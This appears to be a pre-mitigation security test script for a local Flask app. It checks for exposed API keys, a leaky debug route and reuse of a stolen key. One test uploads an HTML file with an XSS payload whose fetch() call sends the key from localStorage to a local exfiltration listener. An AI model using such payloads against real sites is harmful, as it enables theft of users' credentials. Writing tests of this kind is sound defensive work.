import requests
import subprocess
import time
import os
import threading
import json
from bs4 import BeautifulSoup
from http.server import HTTPServer, BaseHTTPRequestHandler

BASE = 'http://127.0.0.1:5000'

# Helper to start the Flask app in the same process

def run_app():
    import app as appmod
    app = appmod.app
    app.run(debug=False, use_reloader=False)


def start_server_in_thread():
    t = threading.Thread(target=run_app, daemon=True)
    t.start()
    time.sleep(1)
    return t


class ExfilServer(BaseHTTPRequestHandler):
    logs = []
    def do_GET(self):
        ExfilServer.logs.append(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')


# 1) Detect if API key is present in dashboard DOM or JS

def test_api_key_exposed_in_dashboard():
    start_server_in_thread()
    r = requests.get(BASE + '/dashboard')
    assert r.status_code == 200
    soup = BeautifulSoup(r.text, 'html.parser')
    api_span = soup.find(id='apiKey')
    api = api_span.get_text().strip()
    assert api.startswith('PRE_VULN_API_KEY')
    # Record vuln
    out = {'vulnerability': 'API key exposed in DOM', 'value': api}
    print(json.dumps(out))


# 2) Detect secrets embedded in JS

def test_js_contains_api_key():
    r = requests.get(BASE + '/static/js/app.js')
    assert 'PRE_VULN_API_KEY' in r.text
    out = {'vulnerability': 'API key embedded in JS', 'value': 'found in /static/js/app.js'}
    print(json.dumps(out))


# 3) Demonstrate XSS via file preview and exfiltrate api key

def test_xss_file_preview_exfiltrates_key():
    server = HTTPServer(('127.0.0.1', 8001), ExfilServer)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    # Upload a file that runs JS to read localStorage and send to exfil server
    payload = "<script>fetch('http://127.0.0.1:8001/?q='+localStorage.getItem('apiKey'))</script>"
    files = {'file': ('exploit.html', payload)}
    r = requests.post(BASE + '/preview', files=files)
    assert r.status_code == 200
    # Wait for exfil call
    time.sleep(1)
    server.shutdown()
    assert any('PRE_VULN_API_KEY' in p for p in ExfilServer.logs)
    out = {'vulnerability': 'XSS via file preview; API key exfiltrated', 'exfil': ExfilServer.logs}
    print(json.dumps(out))


# 4) Debug route exposes secrets

def test_debug_route_leaks_config():
    r = requests.get(BASE + '/debug?show=1')
    assert r.status_code == 200
    j = r.json()
    assert j.get('api_key') == 'PRE_VULN_API_KEY_ABC123456'
    out = {'vulnerability': 'Debug route exposes internal config', 'value': j}
    print(json.dumps(out))


# 5) Use stolen API key to call backend API

def test_exploit_with_stolen_key():
    headers = {'X-API-KEY': 'PRE_VULN_API_KEY_ABC123456'}
    r = requests.get(BASE + '/api/use', headers=headers)
    assert r.status_code == 200
    j = r.json()
    assert j.get('result') == 'used'
    out = {'exploit': 'Use stolen API key to access API', 'response': j}
    print(json.dumps(out))


if __name__ == '__main__':
    report = {'vulnerabilities': []}
    tests = [
        ('api_key_in_dashboard', test_api_key_exposed_in_dashboard),
        ('api_key_in_js', test_js_contains_api_key),
        ('xss_preview', test_xss_file_preview_exfiltrates_key),
        ('debug_leak', test_debug_route_leaks_config),
        ('api_stolen_key', test_exploit_with_stolen_key)
    ]

    for name, t in tests:
        try:
            t()
            status = 'vulnerable'
        except AssertionError as e:
            status = 'not_vulnerable_or_failed'
        report['vulnerabilities'].append({'test': name, 'status': status})

    with open('pre_vuln_report.json', 'w') as fh:
        fh.write(json.dumps(report, indent=2))

    print(json.dumps({'report': 'pre-mitigation tests complete', 'report_file': 'pre_vuln_report.json'}))
